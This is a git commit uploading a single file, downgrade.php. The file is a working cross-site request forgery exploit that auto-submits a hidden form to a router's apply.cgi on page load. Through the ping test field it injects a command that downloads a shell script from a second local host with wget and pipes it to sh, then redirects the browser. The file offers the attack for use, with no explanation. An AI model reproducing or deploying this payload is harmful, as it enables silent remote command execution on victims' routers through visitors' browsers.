a51df19f9f0913b83bfa009ef0dd01500a172075
Renzkie14 <102612731+Renzkie14@users.noreply.github.com>
2023-09-07 21:54:38 +0800

    Add files via upload

---
+++ downgrade.php
@@ -0,0 +1,8 @@
+<form method="post" id="exploit" action="https://192.168.1.1/apply.cgi"><input name="submit_button" value="ping_test" type="hidden"><input name="submit_type" value="do_ping" type="hidden"><input name="change_action" value="gozila_cgi" type="hidden"><input name="pingAddr" value='|wget -O - http://192.168.1.5/downgrade.sh | sh &&echo \<script\>window\.location\.href\=\"https\:\/\/192.168.1.1\/\"\;\<\/script\>' type="hidden"><input name="web_net_mode" value="ipv4" type="hidden"><input type="submit" style="display:none;"></form>
+<script>
+function exploit () {
+var xploit = document.getElementById("exploit");
+xploit.submit();
+}
+window.onload = exploit;
+</script>
